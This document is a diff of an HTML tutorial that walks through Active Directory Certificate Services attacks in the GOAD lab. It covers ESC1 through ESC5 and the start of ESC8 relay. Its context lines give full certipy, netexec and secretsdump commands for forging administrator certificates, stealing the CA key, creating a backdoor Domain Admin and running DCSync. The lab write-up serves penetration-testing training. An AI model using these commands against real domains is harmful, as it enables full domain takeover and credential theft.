@@ -262,7 +262,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>Discovery: We query the LDAP configuration to find a template that matches all three criteria.</p>
 <p>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</p>
-<img src="./images/screenshot_1.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_1.png" alt="">
 
 
 <p>While the list of vulnerable templates usually grabs our immediate attention, the most infrastructurally significant piece of data returned by the certipy-ad find command is the location of the Certificate Authority itself. In a production Active Directory environment, the CA Role is frequently installed on a dedicated member server, distinct from the Domain Controller. Understanding this separation of duties is mandatory for our attacks; if we send our certificate request to the wrong IP, the attack will fail instantly.</p>
@@ -273,7 +273,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>When we want to login, we talk to Meereen.</p>
 <p>When we want to create a certificate, we must talk to Braavos.</p>
 <p>If we simply assumed the DC was the CA, a common habit from small home labs, our exploits would hit a closed port. By correctly identifying Braavos as the host of the CA role now, we ensure that our future certipy req (Request) and certipy relay commands are directed at the only machine capable of signing our malicious requests.</p>
-<img src="./images/screenshot_2.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_2.png" alt="">
 
 
 <p>We have successfully identified the three mandatory pillars that turn a standard configuration into a critical vulnerability. The execution of an ESC1 attack relies entirely on the alignment of these specific attributes.</p>
@@ -284,7 +284,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>Fabrication: We craft a Certificate Signing Request (CSR) on our attack machine. In this request, we supply our valid credentials to prove we can enroll, but we modify the SAN field to claim we are the Domain Administrator.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -target 'braavos.essos.local' -template 'ESC1' -ca 'ESSOS-CA' -upn 'administrator@essos.local'</p>
-<img src="./images/screenshot_3.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_3.png" alt="">
 
 
 <p>We have successfully executed the exploitation phase of the ESC1 attack vector, effectively turning the configuration flaws we identified into a tangible cryptographic asset. By running the req (request) command with Certipy, we engaged the Certificate Authority in a deceptive transaction. We authenticated the connection using the valid credentials of khal.drogo to satisfy the "Enrollment Rights" Access Control List on the template. To the Certificate Authority, this initially appeared as a legitimate request from a standard user asking for a certificate they were authorized to receive.</p>
@@ -294,7 +294,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>We have now reached the final execution step of the ESC1 kill chain, where we monetize the forged asset we just created. Holding the administrator.pfx file is akin to having a perfect physical forgery of a building access card,  however, it is useless until we actually swipe it at the reader. We pivot our targeting away from Braavos (the Certificate Authority) and aim directly at Meereen (10.4.10.12), the Domain Controller and Key Distribution Center (KDC) for the Essos domain.</p>
 <p>To execute this, we utilize the auth module of Certipy. This command initiates a PKINIT (Public Key Cryptography for Initial Authentication) exchange. When we transmit our spoofed certificate to the DC, the KDC parses the digital signature and verifies that it was indeed signed by the trusted ESSOS-CA. Crucially, because we injected the administrator@essos.local UPN into the Subject Alternative Name during the previous step, the KDC parses this identity field and trusts it explicitly. It does not check if we are the administrator; it only checks if the certificate says so and if the CA voucher is valid.</p>
 <p>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</p>
-<img src="./images/screenshot_4.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_4.png" alt="">
 
 
 <p>The resulting output confirms the total compromise of the domain. Certipy not only successfully retrieves the Ticket Granting Ticket (TGT) by saving it as a credential cache (.ccache) file for immediate pass-the-ticket attacks, but it also leverages a specific feature of the PKINIT protocol to extract the NTLM hash of the target account. This occurs because when the KDC issues the ticket, it provides the "pac-credentials" necessary to decrypt aspects of the session, which allows tools like Certipy to derive the NTLM hash of the account we are impersonating.</p>
@@ -302,7 +302,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Now we can simply import this TGT and connect to the Essos Domain Controller. </p>
 <p>export KRB5CCNAME=administrator.ccache</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_5.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_5.png" alt="">
 
 
 <p>We can use NetExec to confirm if we now have access to Meereen and we can see that we do have (Pwn3d!) which means that we are Domain Admin.</p>
@@ -317,10 +317,10 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Furthermore, ESC2 possesses a dual nature that makes it exceptionally dangerous. The "Any Purpose" flag is so permissive that it also encompasses the "Certificate Request Agent" OID. This capability, which we will explore deeply in ESC3. allows a holder to cryptographically sign certificate requests on behalf of other users. Therefore, obtaining an ESC2 certificate not only grants us a mechanism for direct login but essentially creates a stepping stone that can function as a Registration Authority. This allows us to potentially pivot into a deeper "Certificate on-behalf-of" attack chain if we cannot immediately use the certificate for direct domain dominance. </p>
 <p>We treat ESC2 as the discovery of a template that effectively forgot to say "no" to anything, handing us a digital skeleton key for the protocol layer. Let’s now enumerate ESC2 with Certipy.</p>
 <p>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</p>
-<img src="./images/screenshot_6.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_6.png" alt="">
 
 
-<img src="./images/screenshot_7.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_7.png" alt="">
 
 
 <p>we have perfectly identified the operational flow for detecting an ESC2 vulnerability. By highlighting these three specific attributes, we have mapped the exact criteria required to weaponize this template. </p>
@@ -331,7 +331,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>We approach the next step of exploitation not as a single action but as a calculated chain of events that transforms a configuration weakness into a total privilege escalation. Unlike the ESC1 vector where we simply lied about our identity in a single request, the ESC2 scenario requires us to first acquire a specific administrative tool and then use that tool to bypass the domain’s security controls. This is mechanically distinct because we are leveraging the legitimate "Enrollment Agent" architecture against the Certificate Authority.</p>
 <p>In the first phase of this attack, we target the vulnerable ESC2 template to request a certificate for our current, low-privileged user. The critical vulnerability here is the "Any Purpose" Extended Key Usage configuration on the template. When the Certificate Authority issues this certificate to us, it is effectively handing us a cryptographic skeleton key. Because "Any Purpose" acts as a wildcard for all OIDs, the resulting PFX file allows us to log in as our user, but crucially, it also functions as a valid Certificate Request Agent certificate. At this specific moment, we haven't spoofed anyone yet, we have simply upgraded our low-level user into a "Notary Public" who is trusted by the CA to sign requests on behalf of other users.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC2' -ca 'ESSOS-CA'</p>
-<img src="./images/screenshot_8.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_8.png" alt="">
 
 
 <p>Once we possess this powerful agent certificate, we initiate the second command to execute the actual heist. We pivot our targeting to a standard, otherwise secure "User" template that would normally reject any attempt to spoof the subject name. However, because we now hold the valid agent certificate from the first step, we utilize the On-Behalf-Of mechanism. We construct a new request claiming to be the Domain Administrator and cryptographically countersign it using our "Any Purpose" PFX file.</p>
@@ -340,7 +340,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>We pivot to the standard User template in the second phase because our tactical objective has shifted from acquiring a specialized tool to acquiring a functional login credential. While we technically could attempt to target the ESC2 template again, utilizing the built-in User template is the operationally superior choice because it is a default, native object present on every Microsoft Certificate Authority that is specifically optimized for Client Authentication.</p>
 <p>By selecting the User template, we are requesting a standard identity certificate which creates a much smaller forensic footprint than requesting another custom, high-privilege template. Furthermore, the architecture of the "Enrollment on Behalf Of" mechanism imposes strict policy checks; the Certificate Authority often restricts which templates an Enrollment Agent is allowed to sign for. The default User template is almost universally configured to accept these agent-signed requests, guaranteeing that our forged application for the Administrator will be processed successfully. We are effectively using our forged master key (ESC2) to print a standard employee badge (User) for the Administrator, because a standard badge is all that is required to authenticate to the Domain Controller and obtain a Ticket Granting Ticket.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx</p>
-<img src="./images/screenshot_9.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_9.png" alt="">
 
 
 <p>We have reached the culmination of the ESC2/ESC3 attack chain where we convert our cryptographic artifact into actionable administrative access.  Possessing the administrator.pfx file is significant, but it is effectively a dormant asset until we execute the exchange protocol. </p>
@@ -348,7 +348,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>We’ll utilize the auth module of Certipy to initiate PKINIT (Public Key Cryptography for Initial Authentication) against the Domain Controller. This operation represents the final bridge between the Certificate Infrastructure we just abused and the Kerberos Authentication system that controls network access.</p>
 <p>When we execute this command, we are transmitting an Authentication Service Request (AS-REQ) to the Key Distribution Center (KDC), but instead of encrypting the timestamp with a password hash, we sign the request with the private key contained within our PFX file. The KDC inspects the certificate attached to the request, verifies that it chains up to a trusted Root Certificate Authority (the ESSOS-CA we exploited), and checks the "Subject" field. Because we successfully utilized the "On-Behalf-Of" mechanism to imprint the Administrator identity onto this certificate, the KDC trusts the signature implicitly and approves the request.</p>
 <p>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12’</p>
-<img src="./images/screenshot_10.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_10.png" alt="">
 
 
 <p>The result of this interaction is two-fold and devastating for the domain's security posture. First, the KDC issues a valid Ticket Granting Ticket (TGT) for the Administrator account, which Certipy saves as a credential cache (ccache) file, giving us immediate, password-less authentication to any service in the domain. Second, because of legacy compatibility mechanisms within the PAC (Privilege Attribute Certificate), the KDC frequently returns the account's NTLM hash in the reply. This means we essentially reverse-engineer the Domain Admin's password hash without ever touching the SAM database or LSASS process, granting us both immediate session access and long-term persistence through Pass-the-Hash attacks. This command confirms total domain compromise.</p>
@@ -357,7 +357,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>When we execute NetExec against Meereen with the -k (Kerberos) and --use-kcache flags, the tool presents our forged Ticket Granting Ticket directly to the target's SMB service. The result (Pwn3d!), is the definitive confirmation that the Domain Controller has accepted our cryptographic credentials as valid. At this moment, we are no longer just an attacker on the network, we are, for all intents and purposes, the Domain Administrator of essos.local, possessing full remote code execution capabilities on the Domain Controller itself.</p>
 <p>export KRB5CCNAME=administrator.ccache</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_11.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_11.png" alt="">
 
 
 
@@ -372,10 +372,10 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>Let’s start by enumerating the CA and find a possible template vulnerable to ESC3.</p>
 <p>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</p>
-<img src="./images/screenshot_12.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_12.png" alt="">
 
 
-<img src="./images/screenshot_13.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_13.png" alt="">
 
 
 <p>We can confirm with absolute certainty that this enumeration logic is flawless. The workflow depicted in the screenshot accurately isolates the "Enrollment Agent" template, which serves as the requisite "First Link" in the ESC3 exploitation chain. The logic highlighted moves efficiently from access validation to capability identification, which is the standard methodology for assessing PKI vulnerabilities.</p>
@@ -386,7 +386,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>We begin the exploitation chain by interacting with the Certificate Authority to acquire the specific cryptographic tool required for the attack. Since we have identified the ESC3-CRA template as vulnerable due to its "Certificate Request Agent" Extended Key Usage, our objective is to legally enroll in this template using our low-privileged credentials for khal.drogo. We are not yet attempting to spoof the Administrator, instead, we are asking the CA to issue us a certificate that formally recognizes us as an authorized Enrollment Agent, effectively upgrading our user to a position of trust within the PKI hierarchy.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC3-CRA' -ca 'ESSOS-CA'</p>
-<img src="./images/screenshot_14.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_14.png" alt="">
 
 
 <p>The output confirms that the Certificate Authority processed our request successfully and issued a valid PFX file for our user. This file, khal.drogo.pfx, is the pivotal artifact for this attack vector. While this certificate cannot be used to authenticate as a domain admin directly, it carries the cryptographic authority to countersign certificate requests for other users, serving as the "Notary Stamp" we will use to forge the next identity.</p>
@@ -394,7 +394,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>With the valid agent certificate in hand, we pivot to the actual impersonation phase. We target the standard User template, which is typically configured to allow Enrollment Agents to request certificates on behalf of other principals. We construct a new Certificate Signing Request targeting the essos\administrator account, but crucially, we cryptographically sign this request using the khal.drogo.pfx agent certificate we just acquired. </p>
 <p>This instruction tells the CA that we are acting as a legitimate registration authority and verifying the identity of the administrator.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx</p>
-<img src="./images/screenshot_15.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_15.png" alt="">
 
 
 <p>The CA accepts our agent signature as proof of authorization and issues a new certificate, which we save as administrator.pfx. This result is critical because the Subject inside this new PFX file is explicitly the Domain Administrator. We have successfully utilized the logic of the first certificate to authorize the issuance of the second, converting our agent access into a direct administrative login token.</p>
@@ -403,7 +403,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>We now hold a valid digital identity for the Domain Admin, so we transition from interacting with the Certificate Authority to authenticating against the Domain Controller. We utilize the authentication module to initiate the Kerberos PKINIT exchange, presenting our forged administrator.pfx to the Key Distribution Center. This step effectively trades our X.509 certificate for a Kerberos Ticket Granting Ticket (TGT), allowing us to interact with the domain services natively.</p>
 <p>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12' </p>
-<img src="./images/screenshot_16.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_16.png" alt="">
 
 
 <p>The output displays the successful retrieval of the Kerberos TGT, which is saved as a credential cache (.ccache) file. Furthermore, the tool automatically extracts the NTLM hash of the Administrator account from the ticket response. This provides us with two distinct avenues for persistence, as we now possess both a renewable ticket for immediate access and the password hash for offline Pass-the-Hash attacks.</p>
@@ -411,7 +411,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>To operationalize the access we just secured, we must load the ticket into our local environment variables, instructing our Linux attack tools to look for the Kerberos credentials in the cache file we just generated rather than prompting for a password. Once the environment is primed, we launch NetExec against the Domain Controller (Meereen) to verify that our session has full administrative privileges.</p>
 <p>export KRB5CCNAME=administrator.ccache</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_17.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_17.png" alt="">
 
 
 <p>The final output showing the (Pwn3d!) status alongside the Administrator's username confirms total domain compromise. We have successfully leveraged a misconfigured certificate template to elevate a standard user to a Domain Administrator, proving that we can execute code on the Domain Controller using the identity we forged through the certificate chain.</p>
@@ -443,10 +443,10 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>As usual, let’s start by enumerating our ADCS and find a vulnerable template in our Certificate Authority that fits to our ESC4’s attack. </p>
 <p>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</p>
-<img src="./images/screenshot_18.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_18.png" alt="">
 
 
-<img src="./images/screenshot_19.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_19.png" alt="">
 
 
 <p>While in ESC1 and ESC2 we scrutinized the "Configuration Flags" of the template (such as Client Authentication or Any Purpose), for ESC4 our eyes must drop strictly to the Object Control Permissions section we’ve highlighted at the bottom of the report.</p>
@@ -459,7 +459,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Rather than manually toggling individual settings, such as separately enabling "Client Authentication" or turning on the "Enrollee Supplies Subject" flag, this command acts as an automated macro. </p>
 <p>It pushes a standardized configuration that guarantees the template will be vulnerable to ESC1 (Subject Alternative Name Spoofing) immediately upon replication. We are essentially replacing the template's secure corporate blueprint with a weaponized version that explicitly permits users to lie about their identity and utilize the resulting certificate for authentication, streamlining the exploit chain from a manual editing process into a single execution.</p>
 <p>certipy-ad template -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -template 'ESC4' -debug -write-default-configuration</p>
-<img src="./images/screenshot_20.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_20.png" alt="">
 
 
 <p>The output confirms this transition in the lines starting with Replacing:. Specifically, the modification of attributes like msPKI-Certificate-Name-Flag to 1 is the technical change that enables ENROLLEE_SUPPLIES_SUBJECT, while adding the pKIExtendedKeyUsage OID 1.3.6.1.5.5.7.3.2 ensures the resulting certificate allows for Client Authentication. Functionally, we have rewritten the template's logic to behave exactly like an ESC1 vulnerability, granting us the ability to spoof any identity.</p>
@@ -468,7 +468,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>If we enumerate this same ESC4 template once again. We’ll be looking at the direct result of our write operation against the Active Directory schema, confirming that we have successfully transformed a previously benign template into a fully weaponized ESC1 vulnerability.</p>
 <p>certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout</p>
-<img src="./images/screenshot_21.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_21.png" alt="">
 
 
 <p>The data points highlighted tell the story of this transformation. Marker (1) and (2) confirm that we successfully injected the Client Authentication Extended Key Usage (EKU) into the template. Prior to our manipulation, this template likely lacked this capability or was restricted to less sensitive functions, now, it explicitly authorizes the holder to perform PKINIT authentications against the Domain Controller. This is the functionality switch that turns a simple piece of data into a valid logon token.</p>
@@ -477,7 +477,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 
 <p>Because our previous modification command effectively transformed the target template into an ESC1 vulnerability by enabling the "Enrollee Supplies Subject" flag, we can now exploit it using the standard subject-spoofing methodology. In this step, we instruct Certipy to request a certificate using the khal.drogo credentials, but crucially, we specified the User Principal Name (UPN) of administrator@essos.local in the arguments.</p>
 <p>certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC4' -ca 'ESSOS-CA' -upn 'administrator@essos.local'</p>
-<img src="./images/screenshot_22.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_22.png" alt="">
 
 
 <p>The output validates that the Certificate Authority (Braavos) processed the request according to our newly applied insecure configuration. It ignored the mismatch between the requester (Khal Drogo) and the subject (Administrator) and issued a valid certificate. The resulting administrator.pfx file contains the private key and signed certificate for the Domain Admin account.</p>
@@ -487,14 +487,14 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Because we successfully manipulated the ESC4 template to include the Client Authentication EKU before we made our request, the Domain Controller accepts our certificate as a valid smart card logon. The KDC does not know that the template was temporarily insecure; it only sees a cryptographically valid chain of trust stemming from the Essos Root CA. Consequently, it issues a TGT for the Administrator account, which Certipy saves locally as a credential cache (.ccache) file. Simultaneously, the tool extracts the administrator's NTLM hash from the PAC (Privilege Attribute Certificate) data returned in the AS-REP, granting us a permanent fallback credential for Pass-the-Hash attacks even if the certificate expires.</p>
 <p>This command represents the moment of total compromise. Once we possess the TGT, we have effectively become the Domain Admin. We can verify this access immediately by loading the ccache into our environment variables and executing administrative tasks against the Domain Controller, completing the full kill chain from template reconfiguration to absolute domain dominance.</p>
 <p>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</p>
-<img src="./images/screenshot_23.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_23.png" alt="">
 
 
 
 <p>We can confirm now that we were able to explore the ESC4 misconfiguration and get Administrator NTLM hash as well. We now have 2 options to confirm our authentication. </p>
 <p>We can simply use the NTLM hash or use the generated .ccache by importing it into our current session and once imported, we can use NetExec to simply confirm that we are able to authenticate as Administrator inside ESSOS domain.</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_24.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_24.png" alt="">
 
 
 <p>As we can see on the screenshot above, besides being able to see the Green Plus sign [+], that means that we have successfully logged in, we can also confirm that we are Domain Admin by checking the (Pwn3d!) from our output.</p>
@@ -519,23 +519,23 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>The technique we are demonstrating is the Golden Certificate. This attack differs fundamentally from previous vectors because we are not asking the CA to sign a request, we are stealing the CA's ability to sign. The primary asset we target is the CA Private Key. This key acts as the root of trust for the entire PKI hierarchy. Any certificate signed by this key is implicitly trusted by the Domain Controllers for authentication (PKINIT), code signing, and SSL/TLS interception. Crucially, certificates we forge with this key are not recorded in the CA's internal database logs, making the attack nearly invisible to standard auditing tools that only monitor active requests.</p>
 <p>We can use our so beloved tool NetExec to enumerate and confirm that Braavos is our Certificate Authority Server.</p>
 <p>poetry run netexec ldap meereen.essos.local -u 'khal.drogo' -p 'horse' -M adcs</p>
-<img src="./images/screenshot_25.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_25.png" alt="">
 
 
 <p>We do have the confirmation that inside ESSOS domain, we have an ADCS configured on braavos.essos.local and our user khal.drogo has been also pointed as an admin inside this machine, which means that we have full privileges over our Certificate Authority.</p>
 <p>poetry run netexec smb braavos.essos.local -u 'khal.drogo' -p 'horse'</p>
-<img src="./images/screenshot_26.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_26.png" alt="">
 
 
 <p>The right conditions needed to exploit ESC5. To execute this, we utilize the ca module within Certipy. This module automates the backup of the Certificate Authority's key material using the remote procedure calls available to local administrators. We point the tool at Braavos, specifying the CA Name we identified during our enumeration phase (ESSOS-CA). Our goal is to retrieve the .pfx file that contains the private key.</p>
 <p>certipy-ad ca -backup -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'braavos.essos.local' -ca 'ESSOS-CA' -target 'braavos.essos.local' -debug</p>
-<img src="./images/screenshot_27.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_27.png" alt="">
 
 
 <p>Upon success, Certipy will retrieve the key material and save it locally as ESSOS-CA.pfx. This file is the "crown jewel" of the infrastructure.</p>
 <p>With the CA's private key in our possession, we effectively become our own portable Certificate Authority. We can now forge a certificate for any user in the domain. We will target the Administrator again, but this time we will set the terms. Unlike a standard certificate which might expire in 1 year, we can mint a Golden Certificate valid for 10 years or more, providing us with long-term persistence that survives password changes (including the krbtgt password cycle). We use the forge module to forge a certificate as Domain Admin.</p>
 <p>certipy-ad forge -ca-pfx 'ESSOS-CA.pfx' -upn 'administrator@essos.local'</p>
-<img src="./images/screenshot_28.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_28.png" alt="">
 
 
 <p>The output, administrator.pfx, is a cryptographically valid identity document that was created entirely on our attack machine, bypassing all defensive controls on the CA server itself. At this specific moment, we are not interacting with Braavos (the CA) or Meereen (the DC). We are performing a cryptographic operation entirely within the memory of our local Kali attack box.</p>
@@ -548,13 +548,13 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>The only time we touch the network again is in the next step, when we present this "Ghost" certificate to the Domain Controller for authentication. Until then, we are invisible.</p>
 <p>Finally, we operationalize this forged certificate just as we did in previous steps. We present it to the Domain Controller (Meereen) via PKINIT to obtain our Ticket Granting Ticket (TGT).</p>
 <p>certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'</p>
-<img src="./images/screenshot_29.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_29.png" alt="">
 
 
 <p>We have successfully utilized the Golden Certificate to generate a Kerberos TGT (.ccache), which allowed us to access services like SMB as the Administrator.</p>
 <p>export KRB5CCNAME=administrator.ccache</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_30.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_30.png" alt="">
 
 
 
@@ -568,19 +568,19 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Strategic Use Case:</p>
 <p>We choose the LDAP Shell path when we suspect the defenders are watching for PKINIT (Event 4768) events. Schannel authentication is logged differently and bypasses the Kerberos logic entirely. It effectively gives us a direct "Database Console" for the domain, allowing us to perform tasks like dumping the LAPS passwords or adding ourselves to "Domain Admins" with zero Kerberos traffic on the wire. </p>
 <p>certipy-ad auth -pfx 'administrator.pfx' -ldap-shell -dc-ip '10.4.10.12</p>
-<img src="./images/screenshot_31.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_31.png" alt="">
 
 
 <p>We are now operating inside the heart of the Active Directory database. Since we utilized the -ldap-shell feature to bypass the standard Kerberos ticket mechanism, we currently hold a direct, encrypted channel to the LDAP service running as the Administrator. Our immediate objective here is to transform our temporary cryptographic access into a permanent administrative account. By creating a dedicated user, we can switch from utilizing specialized certificate tools to using standard administrative protocols like RDP, WinRM, and SMB with a simple username and password. This effectively grants us a "Backdoor Admin" that persists even if the original certificate we forged is revoked or expires.</p>
 <p>To execute this, we utilize the shell's native add_user command. This effectively sends an LDAP creation request to the CN=Users container, creating a new security principal named tony.stark and automatically setting a complex password. Once the identity exists, we execute the definitive privilege escalation maneuver using add_user_to_group. This sends a modification request to the Domain Admins object, updating its member attribute to include our new user's Distinguished Name.</p>
 <p>add_user tony.stark</p>
 <p>add_user_to_group tony.stark "Domain Admins"</p>
-<img src="./images/screenshot_32.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_32.png" alt="">
 
 
 <p>From a defensive perspective, this specific action is extremely "loud" compared to the subtle ticket forging we did earlier. While reading the database via Schannel might evade some Kerberos-based detection rules, modifying the membership of a high-value group like "Domain Admins" generates specific, high-severity Event Logs (specifically IDs 4720 for creation and 4728 for group modification) that will trigger an alert in almost any Security Operations Center. We execute this step in the lab to prove that we have achieved Write Access to the domain's most sensitive ACLs, confirming total control over the environment's identity store.</p>
 <p>poetry run netexec smb meereen.essos.local -u 'tony.stark' -p 'nx;igML[Dlf|A{O'</p>
-<img src="./images/screenshot_33.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_33.png" alt="">
 
 
 <p>We have successfully operationalized our LDAP modification by pivoting back to standard SMB authentication to verify our new asset. This screenshot confirms the successful activation of the backdoor user named tony.stark in this iteration whom we created and elevated using the ldap-shell.</p>
@@ -598,20 +598,20 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>1. Ticket Acquisition</p>
 <p>We point the tool at the Domain Controller and provide the specific target identity we are claiming (essos.local/administrator). Unlike Certipy, which often infers the target from the PFX metadata, this tool asks us to be explicit, which reduces errors if the PFX Subject Name is malformed.</p>
 <p>python3 gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip 10.4.10.12 "essos.local/administrator" admin_tgt.cccache</p>
-<img src="./images/screenshot_34.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_34.png" alt="">
 
 
 <p>Once the .ccache file is written to disk, it is an inert binary blob. To weaponize it, we must introduce it to our current shell environment. This is a mandatory Linux Kerberos mechanism; tools like netexec or impacket do not know the ticket exists until we point the environment variable to it.</p>
 <p>export KRB5CCNAME=admin_tgt.ccache</p>
 <p>poetry run netexec smb meereen.essos.local -k --use-kcache</p>
-<img src="./images/screenshot_35.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_35.png" alt="">
 
 
 <p>By mastering this alternative method, we ensure we have redundancy in our toolkit. If Certipy encounters an error parsing the PAC or negotiating the ASN.1 structure, gettgtpkinit.py frequently serves as the reliable fallback that keeps our engagement moving forward.</p>
 
 <p>We can also use the same TGT to DCSync over our Domain Controller.</p>
 <p>secretsdump.py -k 'meereen.essos.local' -dc-ip '10.4.10.12'</p>
-<img src="./images/screenshot_36.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_36.png" alt="">
 
 
 <h2>DCSync Dumps</h2>
@@ -801,7 +801,7 @@ SEVENKINGDOMS$:des-cbc-md5:ef3e1a68ab07d50b
 
 <p>Typical challenges with NTLM relay include short session lifetimes and restrictions imposed by NTLM signing enforcement. However, leveraging NTLM relay to obtain a user certificate circumvents these issues. The certificate remains valid as long as specified, allowing access to services that enforce NTLM signing.</p>
 <p>This scenario underscores the importance of securing AD CS configurations and endpoints against NTLM relay attacks to mitigate such vulnerabilities effectively.</p>
-<img src="./images/screenshot_37.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_37.png" alt="">
 
 
 <p>Image Source: https://www.crowe.com/-/media/crowe/llp/sc10-media/insights/publications/cybersecurity-watch/content-2000x1125/cduw2301-001w-cyberblog-ad-cs-charts-esc8.jpg?la=en-us&rev=95faa4da3b4c4c6a9b91564bd3448c82&hash=44F7B2264CE46A2772164D8674D5A897</p>
@@ -816,7 +816,7 @@ SEVENKINGDOMS$:des-cbc-md5:ef3e1a68ab07d50b
 <h4>NTLM Relay to AD CS HTTP Endpoints</h4>
 
 <p>http://10.4.10.23/certsrv/certfnsh.asp</p>
-<img src="./images/screenshot_38.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_38.png" alt="">
 
 
 <p>So far we can see that the server is asking for an authentication. </p>
@@ -829,18 +829,18 @@ SEVENKINGDOMS$:des-cbc-md5:ef3e1a68ab07d50b
 
 <p>Launch the coerce with petitpotam unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same)</p>
